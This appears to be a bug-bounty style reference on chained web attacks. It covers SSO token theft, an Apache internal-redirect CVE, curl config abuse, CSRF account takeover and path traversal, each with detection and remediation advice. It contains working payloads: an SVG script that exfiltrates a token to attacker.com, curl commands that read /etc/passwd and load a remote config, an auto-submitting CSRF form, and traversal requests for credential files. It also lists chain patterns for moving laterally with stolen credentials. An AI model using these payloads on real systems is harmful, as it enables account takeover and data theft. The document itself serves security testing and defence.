# Chained Attack Patterns

Multi-step attack chains that combine multiple vulnerabilities for increased impact. Each chain demonstrates how seemingly low-severity issues can combine to achieve critical impact.

---

## Chain 1: SSO Token Theft via Open Redirect + XSS + CSRF

This chain combines open redirect, SVG XSS, CSRF login, and non-expiring tokens to achieve full account takeover.

### Vulnerabilities Used

| # | Vulnerability | Severity (Alone) | Role in Chain |
|---|---------------|-------------------|---------------|
| 1 | Open redirect in OAuth referrer parameter | Medium | Redirects SSO token to attacker-controlled domain |
| 2 | SVG upload XSS | Medium | Executes JS in victim's browser to capture token |
| 3 | CSRF on SSO login | High | Logs victim into attacker's SSO account |
| 4 | Non-expiring SSO token | Medium | Reusable stolen token, no timeout |

### Attack Flow

```
1. Victim is logged into accounts.example.com (SSO provider)
2. Attacker crafts URL that triggers CSRF to log victim into attacker's SSO session
3. Attacker triggers SSO token request with open redirect in referrer parameter
4. The token is redirected to attacker's SVG upload endpoint
5. SVG contains JS that sends the token to attacker's server
6. Attacker uses the token to access victim's account indefinitely
```

### Step-by-Step Breakdown

**Step 1:** Upload an SVG file containing JavaScript to the target's media storage:
```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    var token = window.location.hash.substring(1);
    new Image().src = 'https://attacker.com/steal?token=' + token;
  </script>
</svg>
```

**Step 2:** Craft the open redirect URL:
```
http://accounts.example.com/accounts/sso?client_id=creativesuite-prod&referrer=http://sso.example.com/api/v1/media/xxxxx/file/evil.svg?%23fragment
```
The `%23` encodes `#` which carries the SSO token through redirects.

**Step 3:** Trigger the flow:
1. Attacker sends victim to CSRF login URL that logs them into attacker's SSO account
2. Victim's browser follows redirect to attacker's SVG
3. SVG executes and captures the SSO token from the URL fragment
4. Token is exfiltrated to attacker's server

**Step 4:** Attacker uses the stolen token:
```
http://sso.example.com/sso_continue?ticket=<stolen_token>
```
Token can be reused multiple times since it never expires.

### Detection Strategy

1. **Check referrer validation:** Test if OAuth referrer parameters allow arbitrary subdomains and preserve hash fragments
2. **Check token lifecycle:** Test if SSO tokens have expiration, single-use, or can be revoked
3. **Check CSRF on auth flows:** Test for missing state parameter or CSRF token in OAuth/SSO login
4. **Check file upload sandboxing:** SVG files should be sanitized or served with proper Content-Disposition and CSP

### Remediation

- Add state parameter to SSO login to prevent CSRF
- Disallow hash fragments in OAuth referrer parameters
- Restrict referrer to specific, validated URLs only
- Make SSO tokens single-use with short expiration
- Sanitize SVG uploads or block them entirely
- Serve uploaded files with `Content-Disposition: attachment`

---

## Chain 2: Apache Backend Response to Internal Redirect (CVE-2024-38476)

This chain uses a malicious backend application's response headers to trigger Apache internal redirects, leading to SSRF, information disclosure, or local script execution.

### Vulnerabilities Used

| # | Vulnerability | Severity (Alone) | Role in Chain |
|---|---------------|-------------------|---------------|
| 1 | Insufficient header validation | Medium | Apache trusts backend response headers |
| 2 | Internal redirect functionality | Low | Apache follows internal redirects to handlers |
| 3 | Proxy/AddType misconfiguration | Low | Legacy config enables handler execution |

### Attack Flow

```
1. Backend application returns a response with malicious headers (e.g., Location pointing to a handler)
2. Apache processes the internal redirect from the response
3. The redirect points to a local handler (e.g., CGI, PHP, SSI)
4. Handler executes, potentially running attacker-controlled output
```

### Detection Strategy

1. Check if Apache uses `AddType` directives (legacy pattern) instead of `SetHandler`
2. Identify backend applications whose response headers could be controlled
3. Test if internal redirects from backend responses are processed
4. Check Apache version: 2.4.0 through 2.4.59 are affected

### Remediation

- Upgrade Apache to 2.4.60+
- Replace `AddType` with `SetHandler` where possible
- Validate backend response headers before processing redirects

---

## Chain 3: curl Config File to Arbitrary File Read/Write

This chain uses curl's `--config` option to read local files and write attacker-controlled output.

### Vulnerabilities Used

| # | Vulnerability | Severity (Alone) | Role in Chain |
|---|---------------|-------------------|---------------|
| 1 | External Control of File Name (CWE-73) | Medium | Attacker supplies config file path |
| 2 | No validation on config directives | Low | Config files can set dangerous options |
| 3 | Output path writable by user | Low | Attacker controls destination |

### Attack Flow

```
1. Attacker tricks user into running curl with a malicious config file
2. Config file sets url=file:///etc/passwd and output=/tmp/stolen.txt
3. curl reads local file and writes it to attacker-specified location
4. If curl runs as privileged user, this can lead to system compromise
```

### Payload

```bash
# Create malicious config
echo 'url = "file:///etc/passwd"' > /tmp/malicious.curlrc
echo 'output = "/tmp/stolen_passwd.txt"' >> /tmp/malicious.curlrc

# Trick user into running
curl --config /tmp/malicious.curlrc

# Or chain with SSRF for remote config injection
curl --config http://attacker.com/malicious.curlrc
```

### Detection Strategy

1. Audit use of `--config` with user-supplied paths
2. Check if curl version allows `--config` with remote URLs
3. Review applications that invoke curl with external input

---

## Chain 4: CSRF to Account Takeover

A simple but powerful chain combining CSRF with profile modification endpoints.

### Vulnerabilities Used

| # | Vulnerability | Severity (Alone) | Role in Chain |
|---|---------------|-------------------|---------------|
| 1 | Missing CSRF token on profile edit | Medium | Allows cross-origin state change |
| 2 | Email change without verification | High | Enables password reset flow hijack |

### Attack Flow

```
1. Attacker hosts a malicious HTML page
2. Victim (authenticated to target.com) visits attacker's page
3. Hidden form submits a profile edit changing victim's email
4. Since no CSRF token, the change succeeds
5. Attacker triggers password reset -> reset link goes to attacker's email
6. Attacker sets a new password and takes over the account
```

### Payload

```html
<html>
  <body>
    <form action="http://target.com/account/profile/edit" method="POST">
      <input type="hidden" name="email" value="attacker@example.com" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

### Detection Strategy

1. Check if state-changing endpoints validate Origin/Referer headers
2. Test for anti-CSRF tokens on all POST/PUT/DELETE endpoints
3. Check if sensitive changes (email, password) require re-authentication
4. Test with different Content-Type headers for CSRF bypass

---

## Chain 5: Information Disclosure via Path Traversal + No Auth

Combining path traversal, missing authentication, and information disclosure for data exfiltration.

### Vulnerabilities Used

| # | Vulnerability | Severity (Alone) | Role in Chain |
|---|---------------|-------------------|---------------|
| 1 | Path traversal in file serving endpoint | Medium | Read arbitrary files |
| 2 | No authentication on admin/protected files | High | Access protected resources |
| 3 | Sensitive information in readable files | Medium | Extract credentials/configs |

### Attack Flow

```
1. Discover path traversal vulnerability in file download endpoint
2. Use traversal to read configuration files outside web root
3. Extract database credentials from configuration
4. Use credentials to access internal database
5. Extract sensitive data from database
```

### Payload

```http
GET /download?file=../../../WEB-INF/classes/application.properties
GET /static/../../../../etc/passwd
GET /api/files?path=../../../backup/database.sql
```

### Detection Strategy

1. Test all file-serving endpoints for path traversal
2. Check if authentication is enforced on internal resources
3. Review documentation/config file contents if accessible
4. Chain discovered credentials to lateral movement

---

## Chain Construction Principles

### Identifying Chainable Vulnerabilities

```yaml
chain_components:
  entry_points:
    - "Open redirect (leads to other domains)"
    - "File upload (persistent XSS)"
    - "CSRF (cross-origin state change)"
    - "SSRF (internal network access)"
    - "XSS (arbitrary JS execution)"
    
  amplifiers:
    - "Missing auth on admin endpoints"
    - "Non-expiring tokens/credentials"
    - "Weak rate limiting"
    - "Permissive CORS"
    - "Debug/verbose error modes"
    
  payloads:
    - "SQL injection in authenticated context"
    - "Command injection in admin functions"
    - "Stored XSS in high-traffic pages"
```

### Common Chain Patterns

```yaml
pattern_1:
  name: "Entry + Privilege Escalation"
  flow: "CSRF/XSS (entry) -> IDOR/Admin API Access (escalate) -> Data Exfiltration"
  
pattern_2:
  name: "Disclosure + Exploitation"
  flow: "Path Traversal (disclosure) -> Credential Extraction (access) -> Lateral Movement"
  
pattern_3:
  name: "Persistent XSS + Trust"
  flow: "Upload XSS Payload (persist) -> Trigger XSS Chain (execute) -> Admin Session Hijack"
  
pattern_4:
  name: "SSRF + Internal Service"
  flow: "SSRF (entry) -> Internal HTTP Service -> RCE via Admin API"
```

---

## Real-World Case References

| Chain | Vulnerabilities Combined | Final Impact | Bounty |
|-------|------------------------|--------------|--------|
| Snapchat SSO ATO (265943) | Open redirect + SVG XSS + CSRF + Non-expiring token | Full account takeover | $7,500 |
| Apache CVE-2024-38476 | Backend response injection + Internal redirect | SSRF + Local code execution | $4,920 |
| curl ACFI (3418646) | CWE-73 + Trusted config parsing | Arbitrary file read/write | N/A |
| CSRF -> ATO (2699029) | Missing CSRF + No email verification | Account takeover | N/A |
| DOD DOM XSS + SSRF | DOM XSS + SSRF on same endpoint | Internal network scanning | N/A |
